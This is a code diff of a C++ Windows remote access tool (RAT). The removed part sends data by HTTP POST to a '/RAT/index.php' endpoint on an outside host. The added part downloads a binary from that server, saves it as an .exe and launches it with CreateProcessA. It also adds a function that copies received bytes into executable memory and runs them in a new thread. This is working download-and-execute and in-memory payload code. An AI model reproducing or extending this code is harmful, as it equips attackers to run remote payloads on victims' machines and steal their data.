@@ -9,6 +9,7 @@
 #include <vector>
 #include <algorithm>
 #include <psapi.h>
+#include <fstream>
 
 using namespace std;
 #pragma comment(lib, "ws2_32.lib")
@@ -20,38 +21,100 @@ void safe_closesocket(SOCKET &clientSocket);
 bool socket_setup(SOCKET &clientSocket);
 void send_data(SOCKET &clientSocket, const string &filename ,const string &data);
 vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename);
+void executeFromMemory(const std::vector<unsigned char>& executableData);
 
 int main()
 {
 
-//    vector<unsigned char> data = receive_data(sock, "target_data.rat");
-//     if (!data.empty())
-//     {
-//         string receivedText(data.begin(), data.end());
-//         cout << "Received Data (Text):";
-//         cout << receivedText << endl;
-//     }
-//     else
-//     {
-//         cerr << "No data received or an error occurred." << endl;
-//     }
+    vector<unsigned char> data;
 
-    vector<unsigned char> data = receive_data(sock, "target_data.rat");
+    // data = receive_data(sock, "cmd.exe");
+    // if (!data.empty())
+    // {
+    //     string receivedText(data.begin(), data.end());
+    //     cout << "Received Data (Text):";
+    //     cout << receivedText << endl;
+    // }
+    // else
+    // {
+    //     cerr << "No data received or an error occurred." << endl;
+    // }
+
+    data = receive_data(sock, "cmd.exe");
+    std::string tempPath = "C:\\Users\\Arth\\Desktop\\downloaded_file.exe";
+    std::ofstream outFile(tempPath, std::ios::binary);
+
+    if (!data.empty()) {
+        outFile.write(reinterpret_cast<const char*>(data.data()), data.size());
+        outFile.close();
+        std::cout << "Downloaded file saved as 'downloaded_file.exe'.\n";
+    } else {
+        std::cerr << "No data received or an error occurred. File not saved.\n";
+    }
     if (!data.empty())
     {
-        cout << "Received Data (Raw Hex): ";
-        for (unsigned char byte : data)
-        {
-            cout << hex << (int)byte << " "; // Print each byte as hex
-        }
-        cout << endl;
+        // cout << "Received Data (Raw Hex): ";
+        // for (unsigned char byte : data)
+        // {
+        //     cout << hex << (int)byte << " "; // Print each byte as hex
+        // }
+        // cout << endl;
     }
     else
     {
         cerr << "No data received or an error occurred." << endl;
-    }    
+    }
+
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof(si);
+
+    if (CreateProcessA(tempPath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        std::cerr << "CreateProcess failed. Error: " << GetLastError() << std::endl;
+    }
+    //executeFromMemory(data);
+
     return 0;
 }
+
+void executeFromMemory(const std::vector<unsigned char>& executableData)
+{
+
+    LPVOID execMemory = VirtualAlloc(nullptr, executableData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    if (!execMemory)
+    {
+        cerr << "VirtualAlloc failed with error: " << GetLastError() << endl;
+        return;
+    }
+
+    // Copy the executable data into the allocated memory
+    memcpy(execMemory, executableData.data(), executableData.size());
+    cout << "Executable data copied to memory." << endl;
+
+    // Create a new thread to execute the code from memory
+    DWORD threadId;
+    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)execMemory, nullptr, 0, &threadId);
+    if (hThread == nullptr)
+    {
+        std::cerr << "Thread creation failed!" << GetLastError() << endl;
+
+        
+        VirtualFree(execMemory, 0, MEM_RELEASE);
+        return;
+    }else cout << "Thread created." << endl;
+
+
+    WaitForSingleObject(hThread, INFINITE);
+    cout << "Thread finished." << endl;
+    // Free the allocated memory after use
+    VirtualFree(execMemory, 0, MEM_RELEASE);
+}
+
 
 bool socket_setup(SOCKET &clientSocket)
 {
@@ -112,61 +175,6 @@ void safe_closesocket(SOCKET &clientSocket)
     }
 }
 
-void send_data(SOCKET &clientSocket, const string &filename ,const string &data)
-{
-    {
-        lock_guard<mutex> lock1(socketMutex); 
-        
-        socket_setup(clientSocket);
-
-        string whole_data = filename+data;
-        string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
-        httpRequest += "Host: arth.imbeddex.com\r\n";
-        httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
-        httpRequest += "Content-Type: application/octet-stream\r\n";
-        httpRequest += "Connection: close\r\n\r\n";
-        httpRequest += whole_data;                                                                // Append the actual data
-
-
-        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
-        if (bytesSent == SOCKET_ERROR)
-        {
-            int error = WSAGetLastError();
-            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-        }
-    
-        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
-
-        char buffer[4096]; // Increased buffer size
-        string receivedData;
-        int bytesReceived;
-
-        do {
-            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
-
-            if (bytesReceived > 0) {
-                buffer[bytesReceived] = '\0';
-                receivedData += buffer; // Append to the received data
-            } else if (bytesReceived == 0) {
-                cerr << "Connection closed by server." << endl;
-                break; // Exit the loop on clean close
-            } else {
-                int error = WSAGetLastError();
-                if (error != WSAECONNRESET) {
-                    cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-                }
-                break; // Exit loop on error
-            }
-        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
-
-        //cout << "\n\nReceived: " << receivedData << endl;
-
-        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
-
-        safe_closesocket(clientSocket);
-    }
-}
-
 vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename)
 {
     lock_guard<mutex> lock1(socketMutex);
@@ -187,30 +195,23 @@ vector<unsigned char> receive_data(SOCKET &clientSocket, const string &filename)
     }
 
     // Receive data in chunks
-    char buffer[4096]; // Increased buffer size
+    char buffer[8192]; // Increased buffer size
     vector<unsigned char> receivedData;
     int bytesReceived;
 
-    do
-    {
+    do {
         bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
-
-        if (bytesReceived > 0)
-        {
+        if (bytesReceived > 0) {
             receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
-        }
-        else if (bytesReceived == 0)
-        {
+        } else if (bytesReceived == 0) {
             cerr << "Connection closed by server." << endl;
-            break; // Exit the loop on clean close
-        }
-        else
-        {
+            break;
+        } else {
             int error = WSAGetLastError();
-            if (error != WSAECONNRESET) cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-            break; // Exit loop on error
+            cerr << "Receive failed with error: " << error << endl;
+            break;
         }
-    } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
+    } while (bytesReceived > 0);
 
     // Ensure header separator is found
     size_t headerEnd = 0;
